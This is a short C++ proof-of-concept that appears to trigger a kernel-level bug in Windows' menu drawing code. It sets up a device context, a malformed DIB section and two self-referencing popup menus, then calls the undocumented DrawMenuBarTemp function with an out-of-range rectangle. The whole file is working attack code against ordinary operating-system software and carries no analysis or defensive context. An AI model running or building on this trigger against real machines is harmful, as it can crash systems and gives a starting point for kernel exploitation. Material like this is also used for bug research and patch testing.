/*
 * cl.exe poc.cpp user32.lib gdi32.lib
 */

#include <stdio.h>
#include <tchar.h>
#include <Windows.h>

typedef NTSTATUS __stdcall DrawMenuBarTemp_T(HWND arg0,
        HDC      arg1,
        RECT  *arg2,
        HMENU    arg3,
        HFONT      arg4);

int _tmain(int argc, _TCHAR* argv[]) {
    DrawMenuBarTemp_T * pfnDrawMenuBarTemp = 0;
    pfnDrawMenuBarTemp = (DrawMenuBarTemp_T *)GetProcAddress(
            GetModuleHandleA("user32.dll"), "DrawMenuBarTemp");
   
    HDC hdc1 = CreateCompatibleDC((HDC)0xbeef);
    printf("[-] hdc1: %08x\n", hdc1);
    HDC hdc2 = CreateCompatibleDC(hdc1);
    printf("[-] hdc2: %08x\n", hdc2);

    BITMAPINFO info;
    memset(&info, 0, sizeof(info));

    info.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    info.bmiHeader.biWidth = 0x9d;
    info.bmiHeader.biHeight = 0xfe;
    info.bmiHeader.biBitCount = 0x20;
    info.bmiHeader.biCompression = 0;
    info.bmiHeader.biSizeImage = 0xb4;
    info.bmiHeader.biXPelsPerMeter = 0x8d; 
    info.bmiHeader.biYPelsPerMeter = 0x0; 
    info.bmiHeader.biClrUsed = 0x75;
    info.bmiHeader.biClrImportant = 0x32;  
    info.bmiHeader.biPlanes = 1;

    PVOID ptr;

    //HANDLE handle1 = NtGdiCreateDIBSection((HANDLE)0xbeef, 0, 0, (PVOID)&info, 1, sizeof(info.bmiHeader), 0x4, 0, &ptr);
    HANDLE handle1 = CreateDIBSection((HDC)0xbeef, &info, 1, (void**)&ptr, 0, 0);
    printf("[-] handle1: %08x\n", handle1);

    HMENU hmenu1 = CreatePopupMenu();
    printf("[-] hmenu1: %08x\n", hmenu1);

    HMENU hmenu2 = CreatePopupMenu();
    printf("[-] hmenu2: %08x\n", hmenu1);

    InsertMenuW(hmenu2, 0xd, 0x54, (UINT_PTR)hmenu1, (LPCWSTR)0xbeef);
    InsertMenuW(hmenu1, 0xd, 0x15, (UINT_PTR)hmenu2, (LPCWSTR)handle1);

    HWND hwnd1 = GetDesktopWindow();
    printf("[-] hwnd1: %08x\n", hwnd1);

    InsertMenuW(hmenu2, 0xf, 0x47, 0x69, (LPCWSTR)handle1);

    RECT r;
    r.top = 0x9d;
    r.bottom = 0x80000007;
    r.left = 0x27;
    r.right = 0x76;
    pfnDrawMenuBarTemp(hwnd1, hdc2, &r, hmenu2, (HFONT)0xbeef);
}